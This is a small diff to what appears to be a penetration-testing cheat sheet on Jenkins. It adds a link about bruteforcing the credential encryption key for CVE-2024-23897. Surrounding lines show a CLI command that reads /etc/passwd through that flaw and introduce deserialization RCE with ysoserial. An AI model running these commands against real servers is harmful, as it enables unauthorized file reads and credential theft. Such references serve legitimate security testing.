@@ -25,6 +25,8 @@ Read third line:
 java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins keep-build "@/etc/passwd"
 ```
 
+[How to bruteforce the credential encryption key.](https://www.errno.fr/bruteforcing_CVE-2024-23897.html)
+
 Deserialization RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)
 ---------------------------------------------------------------------------
 Use [ysoserial](https://github.com/frohoff/ysoserial) to generate a payload.
